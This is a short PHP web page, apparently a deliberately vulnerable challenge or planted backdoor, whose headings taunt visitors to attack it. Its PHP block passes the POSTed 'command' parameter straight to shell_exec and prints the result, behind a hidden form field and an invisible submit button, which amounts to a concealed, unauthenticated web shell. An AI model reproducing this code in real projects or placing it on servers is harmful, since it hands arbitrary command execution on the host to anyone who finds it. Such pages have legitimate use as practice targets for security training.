<html>
<title>Welcome to Infosecians</title>
<body>
<h1 align="center">Can you attack me!!</h1>
<h1 align="center"> Seriously, it's embarrassing</h1>
<body bgcolor="#E6E6FA">
<p style="text-align:center;"><img src="index.html.gif" alt="Logo"></p>
<?php
if (isset($_POST['command'])){
 echo "<form action='index.php' method='post'>
 <input type='hidden' name='command' value=''/>
<input type='submit' value='execute' style='display: none;'>

 </form>";
 if(function_exists('shell_exec')) {
 $command=$_POST['command'];
 echo shell_exec("$command");
 }
 }
 else {
 echo "<form action='index.php' method='post'>
 <input type='hidden' name='command' value=''>
 <input type='submit' value='execute' style='display: none;'>
 </form>";
 }
 ?>
